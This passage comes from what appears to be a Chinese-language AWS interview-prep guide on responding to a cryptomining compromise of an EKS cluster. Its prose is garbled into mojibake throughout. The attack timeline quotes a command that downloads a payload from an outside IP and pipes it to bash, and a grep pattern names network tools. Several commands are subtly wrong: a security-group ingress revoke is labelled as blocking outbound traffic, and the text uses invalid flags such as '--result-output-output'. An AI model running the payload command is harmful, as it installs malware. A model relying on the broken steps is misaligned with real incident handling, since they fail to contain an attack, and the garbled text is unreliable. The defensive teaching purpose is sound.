**æ­¥éª¤3:ä½¿ç”¨Amazon Detectiveè¿›è¡Œå¯è§†åŒ–åˆ†æ**

```
Attack Graph (é‡æ„æ”»å‡»é“¾):

T-7 days:
  â†’ æ”»å‡»è€…ä»GitHubçªƒå–äº†å¼€å‘äººå‘˜çš„Access Key(å¯èƒ½æ˜¯hardcoded)
  â†’ è·å–äº†EKSé›†ç¾¤çš„kubeconfigæƒé™(é€šè¿‡AWS CLI)
  â†’ åˆ›å»ºäº†æ¶æ„Container Imageå¹¶pushåˆ°ECR

T-3 days:
  â†’ æ”»å‡»è€…åœ¨ECRä¸­éƒ¨ç½²äº†åŒ…å«åé—¨çš„é•œåƒ
  â†’ é•œåƒåŒ…å«:coinminer(æŒ–çŸ¿æ¶æ„è½¯ä»¶)ã€backdoor(åé—¨)

T-0 (Today 3AM):
  â†’ æ”»å‡»è€…ä½¿ç”¨è¢«å…¥ä¾µçš„å¼€å‘äººå‘˜å‡­è¯éƒ¨ç½²æ¶æ„Pod
  â†’ Podæ‰§è¡Œ: curl http://45.33.32.156/payload.sh | bash
  â†’ ä¸‹è½½åŠ å¯†è´§å¸æŒ–çŸ¿æ¶æ„è½¯ä»¶(XMRig)
  â†’ GuardDuty Runtime Monitoringæ£€æµ‹åˆ°å¼‚å¸¸è¿›ç¨‹æ‰§è¡Œ
```

**æ­¥éª¤4:æ£€æŸ¥æ¨ªå‘ç§»åŠ¨é£é™©**

```bash
# æ£€æŸ¥å…¶ä»–èŠ‚ç‚¹æ˜¯å¦è¢«æ„ŸæŸ“
kubectl get pods -o wide --all-namespaces | grep "i-0123456789abcdef0"

# æ£€æŸ¥Network Policiesæ˜¯å¦è¢«ç»•è¿‡
kubectl get networkpolicies -n production

# æ£€æŸ¥Privileged Pods(ææƒé£é™©)
kubectl get pods -n production -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

# æ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–Podè¿æ¥åˆ°å¤–éƒ¨IP
kubectl logs -l app=web-app -n production --all-containers=true | grep "45.33.32.156"
```

**æ­¥éª¤5:éªŒè¯æ•°æ®æ³„éœ²é£é™©**

```bash
# æ£€æŸ¥æ„å¤–çš„å¯¹å¤–ç½‘ç»œè¿æ¥
kubectl logs web-app-7f8d9-abcde -n production --previous | grep -E "curl|wget|nc|telnet|openssl"

# æ£€æŸ¥S3è®¿é—®å¼‚å¸¸(ä½¿ç”¨CloudTrail)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceType,AttributeValue=AWS::S3::Bucket \
  --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%S) \
  --filter "ResourceName=web-app*"

# æ£€æŸ¥RDSè¿æ¥å¼‚å¸¸
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventSource,AttributeValue=rds.amazonaws.com \
  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%S)
```

**æ­¥éª¤6:ç¡®å®šæ”»å‡»è€…èº«ä»½**

```bash
# æ£€æŸ¥æ˜¯è°éƒ¨ç½²äº†è¿™ä¸ªPod(åœ¨EKSå®¡è®¡æ—¥å¿—ä¸­)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=web-app-7f8d9-abcde \
  --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%S) | \
  jq -r '.Events[] | select(.eventName == "CreatePod") | .username'

# ç»“æœ: dev-user-john (æ€€ç–‘å…¶å‡­è¯è¢«çªƒå–)
```

#### ğŸš¨ ç¬¬ä¸‰é˜¶æ®µ:å†³ç­–ä¸ä¿®å¤(60-120åˆ†é’Ÿ)

æ ¹æ®è°ƒæŸ¥ç»“æœ,æˆ‘éœ€è¦åˆ¤æ–­æ˜¯**åœºæ™¯A(åŠ å¯†è´§å¸æŒ–çŸ¿)**è¿˜æ˜¯**åœºæ™¯B(æ•°æ®çªƒå–)**:

**åœºæ™¯A:å¦‚æœæ˜¯åŠ å¯†è´§å¸æŒ–çŸ¿(ç›¸å¯¹ç®€å•)**

æ”»å‡»é“¾:
```
çªƒå–å‡­è¯ â†’ éƒ¨ç½²æ¶æ„Pod â†’ ä¸‹è½½æŒ–çŸ¿è½¯ä»¶ â†’ æ¶ˆè€—CPUèµ„æº
```

ä¿®å¤æ­¥éª¤:

```bash
# 1. ç«‹å³åˆ é™¤æ¶æ„Pod
kubectl delete pod web-app-7f8d9-abcde -n production --force --grace-period=0

# 2. æ‰«ææ‰€æœ‰å®¹å™¨é•œåƒ(ä½¿ç”¨Amazon ECR Scan + Trivy)
aws ecr start-image-scan \
  --repository-name web-app \
  --image-id imageTag=latest

# æ£€æŸ¥æ‰«æç»“æœ
aws ecr describe-image-scan-findings \
  --repository-name web-app \
  --image-id imageTag=latest

# 3. åˆ—å‡ºå‘ç°çš„æ¼æ´
# å¦‚æœå‘ç°HIGH/CRITICALçº§åˆ«çš„æ¼æ´:
#   - ä¿®å¤é•œåƒ(æ›´æ–°åŸºç¡€é•œåƒã€å‡çº§ä¾èµ–)
#   - é‡æ–°æ‰«æéªŒè¯
#   - ä½¿ç”¨æ–°çš„é•œåƒtagéƒ¨ç½²

# 4. æ’¤é”€è¢«å…¥ä¾µçš„å¼€å‘äººå‘˜å‡­è¯
aws iam delete-access-key \
  --user-name dev-user-john \
  --access-key-id AKIAIOSFODNN7EXAMPLE

# å¼ºåˆ¶ä¿®æ”¹å¯†ç 
aws iam update-login-profile \
  --user-name dev-user-john \
  --password "$(openssl rand -base64 32)"

# 5. é‡æ–°éƒ¨ç½²åº”ç”¨(ä½¿ç”¨å¹²å‡€çš„é•œåƒ)
kubectl rollout restart deployment web-app -n production

# 6. ç›‘æ§æ–°çš„Pod(ç¡®ä¿æ²¡æœ‰å¼‚å¸¸)
kubectl get pods -n production -w
```

**åœºæ™¯B:å¦‚æœæ˜¯æ•°æ®çªƒå–(å¤æ‚)**

æ”»å‡»é“¾:
```
çªƒå–å‡­è¯ â†’ éƒ¨ç½²æ¶æ„Pod â†’ çªƒå–æ•æ„Ÿæ•°æ® â†’ ä¼ é€åˆ°å¤–éƒ¨æœåŠ¡å™¨
```

ä¿®å¤æ­¥éª¤:

```bash
# 1. ç«‹å³éš”ç¦»æ•´ä¸ªVPC(ä¿®æ”¹NACL,é˜»æ­¢æ‰€æœ‰å‡ºç«™æµé‡)
aws ec2 revoke-security-group-ingress \
  --group-id sg-0123456789abcdef0 \
  --protocol all \
  --port -1 \
  --cidr 0.0.0.0/0

# 2. å¯åŠ¨Forensics EC2å®ä¾‹(æ•è·å®¹å™¨æ–‡ä»¶ç³»ç»Ÿ)
# ä»å—æŸçš„EKSèŠ‚ç‚¹åˆ›å»ºEBSå¿«ç…§
aws ec2 create-snapshot \
  --volume-id vol-0123456789abcdef0 \
  --description "Forensics snapshot for incident $(date +%Y%m%d)"

# åˆ›å»ºforensicså®ä¾‹
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.large \
  --subnet-id subnet-0123456789abcdef0 \
  --security-group-ids sg-forensics \
  --tag-specifications "ResourceType=instance,Tags=[{Key=Purpose,Value=Forensics}]"

# æŒ‚è½½å¿«ç…§å¹¶åˆ†æ
aws ec2 attach-volume \
  --volume-id vol-0123456789abcdef0 \
  --instance-id i-forensics123 \
  --device /dev/sdf

# 3. åˆ†æCloudTrailæ—¥å¿—,ç¡®å®šæ³„éœ²çš„æ•°æ®èŒƒå›´
# ä½¿ç”¨AthenaæŸ¥è¯¢CloudTrail Lake
aws athena start-query-execution \
  --query-string "
    SELECT
      eventTime,
      sourceIPAddress,
      userIdentity.principalId,
      eventName,
      resources
    FROM
      cloudtrail_logs
    WHERE
      eventsource = 's3.amazonaws.com'
      AND source_ip_address = '45.33.32.156'
      AND eventtime > '2025-01-19T03:00:00Z'
  " \
  --result-output-output s3://forensics-results/

# 4. æ£€æŸ¥æ˜¯å¦æœ‰æ•°æ®è¢«ä¿®æ”¹
aws s3api list-objects-v2 \
  --bucket production-data-bucket \
  --query "sort_by(Contents, &LastModified)[?LastModified>='2025-01-19']"

# 5. é€šçŸ¥DPO(Data Protection Officer)å’Œæ³•åŠ¡å›¢é˜Ÿ(åˆè§„è¦æ±‚)
# æ ¹æ®GDPR,å¦‚æœæ˜¯æ•°æ®æ³„éœ²äº‹ä»¶,éœ€è¦åœ¨72å°æ—¶å†…ä¸ŠæŠ¥ç›‘ç®¡æœºæ„
# æ ¹æ®PCI DSS,å¦‚æœæ˜¯æŒå¡äººæ•°æ®æ³„éœ²,éœ€è¦ç«‹å³é€šçŸ¥PCI SSC
```

#### ğŸ›¡ï¸ ç¬¬å››é˜¶æ®µ:æ ¹é™¤ä¸æ¢å¤(2-24å°æ—¶)

**æ ¹é™¤æªæ–½:**

1. **è½®æ¢æ‰€æœ‰å‡­è¯**

```bash
# åˆ é™¤è¢«å…¥ä¾µçš„å¼€å‘äººå‘˜Access Key
aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE

# å¼ºåˆ¶æ‰€æœ‰Podé‡æ–°è·å–ä¸´æ—¶å‡­è¯(IRSA)
kubectl annotate pod -n production --all force-rotation=true

# è½®æ¢KMSå¯†é’¥
aws kms schedule-key-deletion \
  --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
  --pending-window-in-days 7

# åˆ›å»ºæ–°çš„KMSå¯†é’¥
aws kms create-key \
  --description "New key after incident $(date +%Y%m%d)" \
  --tag-policy TagKey=IncidentResponse,TagValue=true
```

2. **åŠ å›ºEKSé›†ç¾¤**

```yaml
# å¯ç”¨Pod Security Standards
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit-version: latest
    pod-security.kubernetes.io/warn-version: latest
```

```bash
# åº”ç”¨åˆ°æ‰€æœ‰namespace
kubectl label ns production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted \
  --overwrite
```

3. **å®æ–½Admission Controller(Opa Gatekeeper)**

```yaml
# ç¦æ­¢ç‰¹æƒå®¹å™¨
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPrivilegedContainer
metadata:
  name: privileged-container
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces:
      - "production"
  parameters:
    exemptImages: []
```

```yaml
# å¼ºåˆ¶æ‰€æœ‰é•œåƒæ¥è‡ªå¯ä¿¡ä»“åº“
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: trusted-repos
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces:
      - "production"
  parameters:
    repos:
      - "123456789012.dkr.ecr.us-east-1.amazonaws.com/*"
```

4. **æ”¹è¿›ä¾›åº”é“¾å®‰å…¨**

```bash
# ç­¾åæ‰€æœ‰å®¹å™¨é•œåƒ(Signing with Sigstore/Cosign)
cosign sign --key cosign.key 123456789012.dkr.ecr.us-east-1.amazonaws.com/web-app:latest

# éªŒè¯ç­¾å
cosign verify --key cosign.pub 123456789012.dkr.ecr.us-east-1.amazonaws.com/web-app:latest
```

```yaml
# åœ¨EKSä¸­é…ç½®Admission ControlleréªŒè¯ç­¾å
apiVersion: v1
kind: ValidatingWebhookConfiguration
metadata:
  name: cosign-admission
webhooks:
  - name: cosign.admission.example.com
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    clientConfig:
      service:
        namespace: cosign-webhook
        name: cosign-webhook-service
    admissionReviewVersions: ["v1"]
    sideEffects: None
```

#### ğŸ“Š ç¬¬äº”é˜¶æ®µ:äº‹åå¤ç›˜(Post-Mortem)

**æ”¹è¿›æªæ–½:**

1. **æ£€æµ‹å¢å¼º**
   - å¯ç”¨GuardDuty **Runtime Monitoring**(æ£€æµ‹å®¹å™¨å†…çš„æ¶æ„å‘½ä»¤)
   - é…ç½®**VPC Flow Logs**åˆ°Amazon Detective
   - å®æ–½å¼‚å¸¸æ£€æµ‹æ¨¡å‹(æœºå™¨å­¦ä¹ )

2. **é¢„é˜²å¢å¼º**
   - å®æ–½**GitOps**(ä»…Gitä»“åº“å¯ä»¥éƒ¨ç½²,ç¦æ­¢æ‰‹åŠ¨kubectl apply)
   - å¯ç”¨**EKS Access Entry**(ç²¾ç»†åŒ–çš„RBAC)
   - é…ç½®**KMS Encryption** for EBS volumes(é˜²æ­¢æ•°æ®è¢«çªƒå–åè¯»å–)
   - å®æ–½**Secrets Manager**(ç¦æ­¢Secretsç¡¬ç¼–ç )

3. **å“åº”ä¼˜åŒ–**
   - è‡ªåŠ¨åŒ–playbookè¦†ç›–æ›´å¤šåœºæ™¯
   - å®šæœŸæ¼”ç»ƒ(æ¯å­£åº¦ä¸€æ¬¡Tabletop Exercise)
   - é›†æˆSOARå¹³å°(å¦‚Splunk SOARã€Cortex XSOAR)

**åˆè§„æ€§æŠ¥å‘Š:**

- ä½¿ç”¨**Audit Manager**ç”Ÿæˆäº‹ä»¶å“åº”æŠ¥å‘Š(ç¬¦åˆPCI DSS Requirement 12.10)
- æ›´æ–°**Security Hub**çš„Insights(Show executive dashboard)
- é€šçŸ¥ç›‘ç®¡æœºæ„(å¦‚æœæ˜¯æ•°æ®æ³„éœ²äº‹ä»¶,æ ¹æ®GDPR 72å°æ—¶å†…ä¸ŠæŠ¥)
- æ›´æ–°å®‰å…¨æ”¿ç­–å’Œæµç¨‹æ–‡æ¡£

**äº‹åå¤ç›˜ä¼šè®®:**
```
æ—¶é—´: äº‹ä»¶å‘ç”Ÿå5ä¸ªå·¥ä½œæ—¥å†…
å‚ä¸è€…:
  - å®‰å…¨å›¢é˜Ÿ
  - å¼€å‘å›¢é˜Ÿ
  - è¿ç»´å›¢é˜Ÿ
  - ç®¡ç†å±‚
  - æ³•åŠ¡å›¢é˜Ÿ(å¦‚æœæ˜¯æ•°æ®æ³„éœ²)

è®®ç¨‹:
1. äº‹ä»¶æ—¶é—´çº¿å›é¡¾
2. æ”»å‡»è€…å¦‚ä½•è¿›å…¥ç¯å¢ƒ?
3. ä¸ºä»€ä¹ˆæˆ‘ä»¬æ²¡æœ‰æ›´æ—©æ£€æµ‹åˆ°?
4. å“åº”æµç¨‹ä¸­æœ‰å“ªäº›å¯ä»¥æ”¹è¿›çš„åœ°æ–¹?
5. å¦‚ä½•é˜²æ­¢ç±»ä¼¼äº‹ä»¶å†æ¬¡å‘ç”Ÿ?
6. æ›´æ–°å®‰å…¨æ”¿ç­–å’Œæµç¨‹
```

#### é¢„æœŸæ•ˆæœ

- â±ï¸ **æ£€æµ‹åˆ°éåˆ¶**: < 15åˆ†é’Ÿ(è‡ªåŠ¨åŒ–å“åº”)
- ğŸ” **æ ¹å› åˆ†æ**: < 1å°æ—¶(ä½¿ç”¨Detectiveå’ŒCloudTrail Lake)
- ğŸ›¡ï¸ **å®Œå…¨æ¢å¤**: < 4å°æ—¶(åŸºäºå¤‡ä»½å’Œé•œåƒ)
- ğŸ“ˆ **å‡å°‘æœªæ¥ç±»ä¼¼äº‹ä»¶90%**(é€šè¿‡å®æ–½è‡ªåŠ¨åŒ–é˜²æŠ¤å’Œä¾›åº”é“¾å®‰å…¨)
- ğŸ“Š **ç¬¦åˆåˆè§„è¦æ±‚**(NIST CSFã€PCI DSSã€GDPR)

---

## æ€»ç»“

è¿™3ç»„é¢è¯•æ¡ˆä¾‹å±•ç¤ºäº†AWSäº‘å®‰å…¨æ¶æ„ä¸“å®¶åœ¨ä¸åŒåœºæ™¯ä¸‹çš„æ€ç»´æ–¹å¼:

### å…³é”®èƒ½åŠ›ä½“ç°

1. **æŠ€æœ¯æ·±åº¦**
   - å…·ä½“çš„JSONç­–ç•¥ã€Terraformä»£ç 
   - AWSæœåŠ¡é…ç½®ç»†èŠ‚
   - å®‰å…¨åŸç†ç†è§£(æœ€å°æƒé™ã€çºµæ·±é˜²å¾¡)

2. **æ¶æ„æ€ç»´**
   - ä»é£é™©è¯„ä¼°åˆ°æ–¹æ¡ˆè®¾è®¡
   - å¤šå±‚æ¬¡é˜²æŠ¤(é¢„é˜²ã€æ£€æµ‹ã€å“åº”)
   - æˆæœ¬vså®‰å…¨vsæ•ˆç‡çš„æƒè¡¡

3. **ä¸šåŠ¡ä»·å€¼**
   - å¼ºè°ƒåˆè§„æ€§(PCI DSSã€NISTã€CIS)
   - è‡ªåŠ¨åŒ–æé«˜æ•ˆç‡
   - é™ä½å®‰å…¨é£é™©å’Œè´¢åŠ¡æŸå¤±

4. **æŒç»­æ”¹è¿›**
   - äº‹åå¤ç›˜(Post-Mortem)
   - å®šæœŸå®¡è®¡å’Œæ¼”ç»ƒ
   - åŸºäºå¨èƒæƒ…æŠ¥è°ƒæ•´ç­–ç•¥

---

**æ–‡æ¡£ç‰ˆæœ¬**: v1.0
**æœ€åæ›´æ–°**: 2025-01-19
**ç»´æŠ¤è€…**: CSA SOP Skill
**é€‚ç”¨åœºæ™¯**: é¢è¯•å‡†å¤‡ã€å®æˆ˜æ¼”ç»ƒã€æŠ€èƒ½æå‡
